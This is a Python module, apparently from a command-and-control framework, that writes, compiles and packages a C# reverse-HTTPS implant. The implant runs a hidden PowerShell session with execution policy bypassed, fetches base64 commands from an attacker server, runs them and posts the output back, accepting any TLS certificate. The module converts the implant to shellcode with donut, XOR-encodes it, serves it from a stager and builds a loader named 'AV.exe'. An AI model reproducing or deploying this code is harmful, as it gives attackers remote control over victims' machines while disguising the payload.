import base64
import os
import tempfile
import json
import subprocess
import shutil
from pathlib import Path
from types import SimpleNamespace
from core.payload_generator.common import payload_utils as payutils
from core.payload_generator.common.payload_utils import XorEncode
from core.payload_generator.windows.https.exe import build_make
from core.malleable_engine.registry import PARSERS, LOADERS
import core.malleable_engine
from core.malleable_engine.base import load_plugins
from core import stager_server as stage
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"

load_plugins()

def _cs_escape(s: str) -> str:
	return s.replace("\\", "\\\\").replace('"','\\"')

def _emit_header_lines(headers: dict, var: str, is_post: bool=False) -> str:
	lines = []
	for k, v in (headers or {}).items():
		if is_post and k.lower() == "content-type":
			lines.append(f'{var}.Content = "new StringContent(json, Encoding.UTF8, {_cs_escape(v)})";')
		else:
			lines.append(f'{var}.Headers.TryAddWithoutValidation("{_cs_escape(k)}", "{_cs_escape(v)}");')
	return "\n".join(lines)

def _emit_post_json_expr(mapping: dict | None) -> str:
	#env = (envelope or "base64-json").lower()
	m = mapping or {"output": "{{payload}}"}
	templ = json.dumps(m, separators=(",", ":"), ensure_ascii=False)
	templ = _cs_escape(templ)
	repl = "\" + outB64 + \""
	templ = templ.replace("{{payload}}", repl)
	return f"\"{templ}\""

def make_raw(ip, port, cfg=None, scheme="https", profile=None):
	base_url = f"{scheme}://{ip}:{port}"
	if profile:
		print(cfg)
		ua = cfg.useragent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
		get_url  = base_url.rstrip("/") + cfg.get_uri
		post_url = base_url.rstrip("/") + cfg.post_uri
		get_headers  = _emit_header_lines(cfg.headers_get, "getReq", is_post=False)
		post_headers = _emit_header_lines(cfg.headers_post, "postReq", is_post=True)
		accept_line = f'getReq.Headers.Accept.ParseAdd("{_cs_escape(cfg.accept)}");' if cfg.accept else ""
		host_line   = f'getReq.Headers.TryAddWithoutValidation("{_cs_escape("Host")}", "{_cs_escape(cfg.host)}");'     if cfg.host else ""
		#range_line  = f'getReq.Headers.Range = new RangeHeaderValue(0, {int(cfg.byte_range)});'  if cfg.byte_range else ""
		try:
			if getattr(cfg, "byte_range", None) is not None and str(cfg.byte_range).strip().isdigit():
				range_line = f'getReq.Headers.Range = new RangeHeaderValue(0, {int(cfg.byte_range)});'

			else:
				range_line = ""
		except Exception:
			range_line = ""

		accept_post = f'postReq.Headers.Accept.ParseAdd("{_cs_escape(cfg.accept_post)})";' if cfg.accept_post else ""
		host_post = f'postReq.Headers.TryAddWithoutValidation("{_cs_escape("Host")}", "{_cs_escape(cfg.host_post)}");' if cfg.host_post else ""
		# we keep your two sleeps but drive them from interval if provided
		sleep_short = int((cfg.interval_ms or 2000) * 0.5)
		if cfg.interval_ms:
			cfg.interval_ms = int(cfg.interval_ms) * 1000

		sleep_long  = int(cfg.interval_ms or 5000)
		# build extraction regex union from mapping
		probe_keys = []

		def _collect(d, path):
			for k, v in d.items():
				if isinstance(v, dict):
					_collect(v, path + [k])
				elif isinstance(v, str) and "{{payload}}" in v:
					probe_keys.append(".".join(path + [k]))

		_collect(cfg.get_server_mapping or {}, [])

		regexes = [
			f'\"{_cs_escape(k.split(".")[-1])}\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"'
			for k in probe_keys
		]

		regexes += [
			'\"Telemetry\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"',
			'\"cmd\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"',
			'\"output\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"',
		]

		probe_union = "|".join(f"(?:{r})" for r in regexes)

		post_json_expr = _emit_post_json_expr(getattr(cfg, "post_client_mapping", None))

	else:
		# legacy hardcoded defaults
		ua = cfg.useragent if cfg.useragent else "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
		get_url = post_url = f"{base_url}/"
		get_headers = cfg.headers_get if cfg.headers_get else ""
		post_headers = cfg.headers_post if cfg.headers_post else ""
		accept_line = cfg.accept if cfg.accept else ""
		host_line = cfg.host if cfg.host else ""
		range_line = cfg.byte_range if cfg.byte_range else ""
		accept_post = ""
		sleep_short, sleep_long = cfg.interval_ms, 5000
		probe_union = '\"Telemetry\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"|(?:\"cmd\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\")'
		post_json_expr = '"{\\"output\\":\\"" + outB64 + "\\"}"'

	payload = f"""

using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;

class Program
{{

	public static void Main(string[] args)
	{{
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		MainAsync(args).GetAwaiter().GetResult();
	}}

	public static async Task MainAsync(string[] args)
	{{
		var sid = GenerateSid();

		string getUrl  = "{_cs_escape(get_url)}";
		string postUrl = "{_cs_escape(post_url)}";

		var psi = new ProcessStartInfo {{
			FileName              = "powershell.exe",
			Arguments             = "-NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass",
			RedirectStandardInput = true,
			RedirectStandardOutput = true,
			RedirectStandardError = true,
			UseShellExecute       = false,
			CreateNoWindow        = true,
		}};
		var ps = Process.Start(psi);
		if (ps == null) {{
			return;
		}}

		var outMem = new MemoryStream();
		var errMem = new MemoryStream();
		Thread tOut = new Thread(() => CopyStream(ps.StandardOutput.BaseStream, outMem)) {{ IsBackground = true }};
		Thread tErr = new Thread(() => CopyStream(ps.StandardError.BaseStream, errMem)) {{ IsBackground = true }};
		tOut.Start();
		tErr.Start();

		var psIn = ps.StandardInput;

		while (true)
		{{

			try
			{{
				var handler = new HttpClientHandler
				{{
					ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator
				}};

				using (var client = new HttpClient(handler) {{ BaseAddress = new Uri(getUrl) }})
				{{
					var getReq = new HttpRequestMessage(HttpMethod.Get, getUrl);
					getReq.Headers.TryAddWithoutValidation("X-Session-ID", sid);
					getReq.Headers.UserAgent.ParseAdd("{_cs_escape(ua)}");
					{accept_line}
					{host_line}
					{range_line}
					{get_headers}

					var getResp = await client.SendAsync(getReq);
					var body = await getResp.Content.ReadAsStringAsync();

					var cmdB64 = ParseTelemetry(body);
					if (!string.IsNullOrEmpty(cmdB64))
					{{
						var cmdBytes = Convert.FromBase64String(cmdB64);
						var cmdText = Encoding.UTF8.GetString(cmdBytes);

						psIn.WriteLine(cmdText);
						psIn.Flush();
					}}

					Thread.Sleep(2000);

					string outRaw;
					lock (outMem)
					{{
						outMem.Position = 0;
						errMem.Position = 0;
						var stdout = new StreamReader(outMem, Encoding.UTF8).ReadToEnd();
						var stderr = new StreamReader(errMem, Encoding.UTF8).ReadToEnd();
						outRaw = stdout + stderr;
						outMem.SetLength(0);
						errMem.SetLength(0);
					}}

					var outBytes = Encoding.UTF8.GetBytes(outRaw);
					var outB64 = Convert.ToBase64String(outBytes);
					var json = {post_json_expr};

					var postReq = new HttpRequestMessage(HttpMethod.Post, postUrl);
					postReq.Headers.UserAgent.ParseAdd("{_cs_escape(ua)}");
					postReq.Content = new StringContent(json, Encoding.UTF8, "application/json");
					postReq.Headers.Add("X-Session-ID", sid);
					{post_headers}

					var postResp = await client.SendAsync(postReq);
					var respBody = await postResp.Content.ReadAsStringAsync();
				}}
			}}
			catch (Exception ex)
			{{
			}}

			Thread.Sleep({sleep_long});
		}}
	}}

	static void CopyStream(Stream input, Stream output)
	{{
		var buffer = new byte[4096];
		int read;
		try
		{{
			while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
			{{
				output.Write(buffer, 0, read);
				output.Flush();
			}}
		}}
		catch (Exception ex)
		{{
		}}
	}}

	static string GenerateSid()
	{{
		const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
		int seed = (int)DateTime.UtcNow.Ticks ^ Process.GetCurrentProcess().Id;
		var rnd = new Random(seed);
		var sb = new StringBuilder(3 * 5 + 2);
		for (int seg = 0; seg < 3; seg++)
		{{
			for (int i = 0; i < 5; i++)
				sb.Append(chars[rnd.Next(chars.Length)]);
			if (seg < 2) sb.Append('-');
		}}
		return sb.ToString();
	}}

	static string ParseTelemetry(string resp)
	{{
		var m = Regex.Match(resp, "{_cs_escape(probe_union)}");
		if (m.Success)
		{{
			return m.Groups["b64"].Value;
		}} else {{
			return null;
		}}

	}}
}}
"""

	return payload


def generate_exe_reverse_https(ip, port, obs, beacon_interval, headers, useragent, stager_ip="0.0.0.0", stager_port=9999,
	accept=None, byte_range=None, jitter=None, profile=None, parser_name="json", loader_name="exe_csharp_https_profile_loader", scheme="https"):

	# Parse → Load → Config for this emitter
	cfg = None
	if profile:
		parser_cls = PARSERS.get(parser_name)
		loader_cls = LOADERS.get(loader_name)
		print(f"PARSERS: {PARSERS}, LOADERS: {LOADERS}")
		if not parser_cls or not loader_cls:
			raise ValueError(f"Parser/Loader not found: {parser_name}/{loader_name}")
		prof = parser_cls().parse(profile)
		if prof is None:
			raise ValueError(f"Invalid profile: {profile}")
		defaults = {
			"headers": headers or {},
			"useragent": useragent,
			"accept": accept,
			"host": (headers or {}).get("Host"),
			"byte_range": byte_range,
			"interval": beacon_interval,
			"jitter": jitter,
			"port": port,
			"transport": scheme,
		}
		cfg = loader_cls().load(prof, defaults=defaults)

	else:
		# No profile → still honor the GUI fields (headers, UA, accept, range, beacon)
		h = headers or {}
		cfg = SimpleNamespace(
			# URIs
			get_uri="/",
			post_uri="/",
			# Headers
			headers_get=h,
			headers_post={k: v for k, v in h.items() if k.lower() != "content-length"},
			# Common header-ish fields
			useragent=useragent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
			accept=accept,
			host=h.get("Host"),
			byte_range=byte_range,               # handled safely in make_raw (numeric-only AddRange)
			accept_post=accept,
			host_post=h.get("Host"),
			# Timing
			interval_ms=int(beacon_interval) * 1000 if beacon_interval else None,
			# Mapping defaults so POST body is {"output":"<b64>"} and GET extracts JSON "output"/"cmd"/"Telemetry"
			get_server_mapping={},
			post_client_mapping={"output": "{{payload}}"},
		)


	if profile:
		raw = make_raw(ip, port, cfg=cfg, scheme=scheme, profile=True)

	else:
		raw = make_raw(ip, port, cfg=cfg, scheme=scheme, profile=False)

	print(raw)

	# 2) write to temp .c file
	fd, c_path = tempfile.mkstemp(suffix=".cs", text=True)
	try:
		with os.fdopen(fd, "w") as f:
			f.write(raw)

		# 3) compile with Mingw‑w64 as x86_64 Windows exe
		exe_path = c_path[:-2] + ".exe"
		mcs = "mcs"
		cmd = [
			mcs,
			"-target:exe",
			"-r:System.Net.Http.dll",
			f"-out:{exe_path}",
			c_path
		]
		#print(f"[+] Compiling payload: {' '.join(cmd)}")
		subprocess.run(cmd, check=True) # stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL

		# 4) run donut to produce shellcode blob (format=raw)
		sc_path = c_path[:-2] + ".bin"
		donut = shutil.which("donut")
		# -f 1 => raw shellcode, -a 2 => amd64, -o => output
		donut_cmd = [donut, "-b", "1", "-f", "3", "-a", "2", "-o", sc_path, "-i", exe_path]
		#print(f"[+] Generating shellcode: {' '.join(donut_cmd)}")
		subprocess.run(donut_cmd) #stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL

		# 5) read the shellcode blob into memory
		try:
			with open(sc_path, "rb") as f:
				shellcode = f.read()

		except Exception as e:
			print(f"ERROR: {e}")

		shellcode = shellcode.replace(b"unsigned char buf[] =", b"")

		with open(sc_path, "wb") as f:
			f.write(shellcode)

		with open(sc_path, "rb") as f:
			donut_file = f.read()

		"""with open("/home/kali/tools/C2/Gunner/gunnerc2/implantdev/learning/c-reverse-shell/rveshell/new/donut_file.c", "wb") as f:
			f.write(donut_file)"""

		# 6) XOR‑encode it using our XorEncode helper
		encoder = XorEncode()
		#encoder.shellcode = bytearray(shellcode)
		length = len(shellcode)
		#print("AFTER length")
		#print("MAKING TEMP FILES FOR XOR ENCODE")

		fd, output_trash = tempfile.mkstemp(suffix=".bin", text=True)
		fd, xor_main_output = tempfile.mkstemp(suffix=".c", text=True)
		payload = encoder.main(sc_path, output_trash, "deadbeefcafebabe", xor_main_output)
		print(f"BUILT PAYLOAD OF TYPE {type(payload)}")
		out = Path.cwd() / "AV.exe"
		#print("STARTING STAGER SERVER")
		#print(f"IP: {stager_ip}, PORT: {stager_port}")
		#print(f"PORT: {type(stager_port)}, PAYLOAD: {type(payload)}, IP, {type(stager_ip)}")
		stage.start_stager_server(stager_port, payload, format="bin", ip=stager_ip)
		#print(brightgreen + f"[+] Serving shellcode via stager server {stager_ip}:{stager_port}")
		#print("RUNNING BUILD")
		build_status = build_make.build(out, payload, stager_ip, stager_port)
		if build_status:
			print(brightgreen + f"[+] Successfully built {out}")
			return str(out)

	finally:
		# clean up temp files
		for p in (c_path, exe_path, sc_path, output_trash, xor_main_output):
			try:
				os.remove(p)

			except OSError:
				pass